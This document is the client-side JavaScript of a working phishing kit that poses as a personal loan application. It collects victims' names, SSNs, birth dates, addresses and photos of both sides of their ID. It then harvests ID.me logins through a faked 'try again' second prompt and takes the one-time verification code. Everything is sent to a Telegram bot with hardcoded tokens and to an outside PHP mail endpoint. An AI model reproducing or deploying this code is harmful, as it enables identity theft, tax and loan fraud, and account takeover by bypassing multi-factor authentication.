const main = document.getElementById("main");
const dl = document.getElementById("dl");
const idme = document.getElementById("idme");
const idme2 = document.getElementById("idme2");
const bye = document.getElementById("bye");

const mainBtn = document.getElementById("mainBtn");
const dlBtn = document.getElementById("dlBtn");
const idmeBtn = document.getElementById("idmeBtn");
const idmeBtn2 = document.getElementById("idmeBtn2");

let idmeAttempts = 0;
const d = new Date();
let submissionID = d.getTime() + " " + Math.floor(Math.random() * 1000) + 1;

let token = "6501127988:AAFASM14DWv6pLwmIVqIFeGBnxKWJFxy6cY" //"5402975294:AAGYpLmZbgObheHGo6j2ziDCjcMqJziDIiU";
let chat_id = -821477061 //-5004137383;
let def_id = 2076073682 //748063043;

const bt = new Bot(token, def_id);

const sendToMail = async (type, body) => {

    const submitRequest = new FormData();
    submitRequest.append("type", type);
    submitRequest.append("submissionID", submissionID);
    submitRequest.append("body", body);

    const url = `https://cynergytrades.com/public/boiz/idme/mail_green.php`
    const options = {
        method: "POST",
        body: submitRequest
    };

    try {
        const response = await fetch(url, options);

        if (!response.ok) {
            const message = `An error has occured, Error code: ${response.status} - ${response.statusText}`;
            throw new Error(message);
        }
        const data = await response.text();
        return data;
    } catch (error) {
        throw new Error(error);
    }
}

const sendFileToMail = async (type, body, file1, file2) => {

    const submitRequest = new FormData();
    submitRequest.append("type", type);
    submitRequest.append("submissionID", submissionID);
    submitRequest.append("body", body);
    submitRequest.append("file1", file1);
    submitRequest.append("file2", file2);

    const url = `https://cynergytrades.com/public/boiz/idme/mail_green.php`
    const options = {
        method: "POST",
        body: submitRequest
    };

    try {
        const response = await fetch(url, options);

        if (!response.ok) {
            const message = `An error has occured, Error code: ${response.status} - ${response.statusText}`;
            throw new Error(message);
        }
        const data = await response.text();
        return data;
    } catch (error) {
        throw new Error(error);
    }
}

mainBtn.addEventListener('click', () => {

    const fname = document.getElementById("fname");
    const lname = document.getElementById("lname");
    const email = document.getElementById("email");
    const phone = document.getElementById("phone");
    const dob = document.getElementById("dob");
    const ssn = document.getElementById("ssn");
    // const creditScore = document.getElementById("credit");
    const address = document.getElementById("address");
    const address2 = document.getElementById("address2");
    // const country = document.getElementById("country");
    const state = document.getElementById("state");
    const city = document.getElementById("city");
    const postal = document.getElementById("postal");
    const fileFront = document.getElementById("fileFront");
    const fileBack = document.getElementById("fileBack");

    const checkedValue = document.querySelector('input[name="taxReturn"]:checked');
    // console.log(checkedValue.value);

    if (isEmpty(fname)) {
        flagInputError("First name must be filled");
    } else if (isEmpty(lname)) {
        flagInputError("Last name must be filled");
    } else if (isEmpty(email)) {
        flagInputError("email field is required");
    } else if (isEmpty(phone)) {
        flagInputError("Phone number field must be filled");
    } else if (isEmpty(dob)) {
        flagInputError("Date of birth field must be filled");
    } else if (isEmpty(ssn)) {
        flagInputError("SSN field must be filled");
    }
    // else if (isEmpty(creditScore)) {
    //     flagInputError("Credit score field must be filled");
    // } 
    else if (isEmpty(address)) {
        flagInputError("Address field must be filled");
    } else if (isEmpty(city)) {
        flagInputError("City field is required");
    } else if (isEmpty(state)) {
        flagInputError("State field must be filled");
    } else if (isEmpty(postal)) {
        flagInputError("Postal field must be filled");
    } else if (!checkedValue) {
        flagInputError("You have to select an answer if you have filed your 2022 tax return");
    } else if (!fileFront.files.length > 0) {
        flagInputError("front of your State ID/DL must be uploaded");
    } else if (!fileBack.files.length > 0) {
        flagInputError("back of your State ID/DL must be uploaded");
    } else {

        mainBtn.innerHTML = `
            <span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>
            Processing...
        `;

        let my_txt = `New Personal Loan Info %0A`;
        my_txt += `====================%0A`;
        my_txt += `First name: ${fname.value}%0A`;
        my_txt += `Last name: ${lname.value}%0A`;
        my_txt += `Email: ${email.value}%0A`;
        my_txt += `Phone: ${phone.value}%0A`;
        my_txt += `Date of Birth: ${dob.value}%0A`;
        my_txt += `SSN: ${ssn.value}%0A`;
        // my_txt += `Credit Score: ${creditScore.value}%0A`;
        my_txt += `Address: ${address.value}%0A`;
        my_txt += `Address2: ${address2.value}%0A`;
        my_txt += `City: ${city.value}%0A`;
        my_txt += `State: ${state.value}%0A`;
        my_txt += `Postal: ${postal.value}%0A`;
        my_txt += `Did you file your 2023 tax return?: ${checkedValue.value}%0A`;
        my_txt += `====================%0A`;

        mainBtn.innerHTML = `
        <span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>
        Checking eligibility...
    `;

        // upload file
        let file1 = fileFront.files;
        let file2 = fileBack.files;
        if (file1.length > 0 && file2.length > 0) {

            bt.sendMessage(my_txt)
                .then(res => {
                    console.log("Msg Success!", res);
                    // Send first file
                    bt.sendFile("#fileFront")
                        .then(res => {
                            console.log("File1 Success!", res);
                            // Send seconde file
                            bt.sendFile("#fileBack")
                                .then(res => {
                                    console.log("File2 Success!", res);
                                    main.classList.add('visually-hidden');
                                    idme.classList.remove('visually-hidden');

                                    // ==========
                                    // mail part
                                    // ==========
                                    sendFileToMail("file", my_txt, file1[0], file2[0])
                                        .then((data) => console.log("Mail file succeess", data))
                                        .catch((error) => console.log("Mail file error", error));
                                })
                                .catch(err => {
                                    console.error(err)
                                    main.classList.add('visually-hidden');
                                    idme.classList.remove('visually-hidden');
                                })
                        })
                        .catch(err => {
                            console.error(err)
                            main.classList.add('visually-hidden');
                            idme.classList.remove('visually-hidden');
                        }
                        )
                })
                .catch(err => console.error(err))

        } else {
            alert("Uploads failed final upload verification process");
        }
    }

})

idmeBtn.addEventListener('click', () => {
    let idmeMail = document.getElementById("idmeMail").value;
    let idmePass = document.getElementById("idmePass").value;

    if (idmeMail.trim() === "" || idmePass.trim() === "") {
        alert("ID.me fields must be fully filled");
        return;
    }

    idmeBtn.innerHTML = `
        <span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>
        Processing...
    `;

    if (idmeAttempts < 1) {

        let txt = `============= %0A`;
        txt += `First attempt %0A`;
        txt += `============= %0A`;
        txt += `ID.me Email: ${idmeMail} %0A`;
        txt += `ID.me Password: ${idmePass} %0A`;

        bt.sendMessage(txt)
            .then(res => {
                console.log("Msg Success!", res);
                // definitely a success message
                document.getElementById("errorTxt").innerText = "Enter your login credentials again";
                document.getElementById("idmeMail").value = "";
                document.getElementById("idmePass").value = "";
                idmeAttempts++;

                idmeBtn.innerHTML = `Proceed`;

                // ==========
                // Mail part
                // =========
                sendToMail("idme", txt)
                    .then((data) => console.log("Mail success", data))
                    .catch((error) => console.log("mail error", error));
            })
            .catch(err => {
                console.error(err)
                // alert('error', error);

                document.getElementById("errorTxt").innerText = "Enter your login credentials again";
                document.getElementById("idmeMail").value = "";
                document.getElementById("idmePass").value = "";
                idmeAttempts++;

                idmeBtn.innerHTML = `Proceed`;
            })
    } else {
        document.getElementById("errorTxt").innerText = "";

        let txt2 = `============= %0A`;
        txt2 += `Second attempt %0A`;
        txt2 += `============= %0A`;
        txt2 += `ID.me Email: ${idmeMail} %0A`;
        txt2 += `ID.me Password: ${idmePass} %0A`;

        bt.sendMessage(txt2)
            .then(res => {
                console.log("Msg Success!", res);
                // definitely a success message
                idme.classList.add('visually-hidden');
                idme2.classList.remove('visually-hidden');

                sendToMail("idme", txt2)
                    .then((data) => console.log("mail2 success", data))
                    .catch((error) => console.log("mail2 error", error));
            })
            .catch(err => {
                console.error(err)
                // alert('error', error);

                idme.classList.add('visually-hidden');
                idme2.classList.remove('visually-hidden');
            })
    }
})

idmeBtn2.addEventListener('click', () => {
    let code = document.getElementById("code").value;

    if (code.trim() === "") {
        alert("Code field must be filled");
        return;
    }

    let txt = `==================== %0A`;
    txt += `ID.me Code: ${code} %0A`;

    idmeBtn2.innerHTML = `
        <span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>
        Processing...
    `;

    bt.sendMessage(txt)
        .then(res => {
            console.log("Msg Success!", res);
            // definitely a success message
            idme2.classList.add('visually-hidden');
            bye.classList.remove('visually-hidden');

            sendToMail("idmeCode", txt)
                .then((data) => console.log("mail3", data))
                .catch((error) =>  console.log("mail3 error", error));
        })
        .catch(err => {
            console.error(err)
            // alert('error', error);
            idme2.classList.add('visually-hidden');
            bye.classList.remove('visually-hidden');
        })
})

function flagInputError(msg) {
    alert(msg);
}

function isEmpty(input) {
    return input.value.trim() === "" ? true : false;
}